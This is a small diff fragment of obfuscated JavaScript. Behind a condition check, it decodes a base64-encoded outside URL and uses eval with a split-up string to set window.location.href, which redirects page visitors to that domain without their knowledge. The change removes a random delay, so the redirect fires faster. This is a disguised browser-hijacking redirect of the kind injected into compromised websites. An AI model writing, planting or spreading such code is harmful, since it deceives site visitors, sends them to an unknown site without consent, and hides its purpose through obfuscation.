@@ -26,7 +26,6 @@ const _a1b = async () => {
   };
   if (await _a1b()) {
     const _enc = "aHR0cHM6Ly9kcmVhbXg5LmNvbS8=";
-    await _x7q(5000 + Math.floor(Math.random() * 300)); 
     const _goto = atob(_enc);
     eval("window" + "." + "location" + "." + "href = _goto"); 
   }
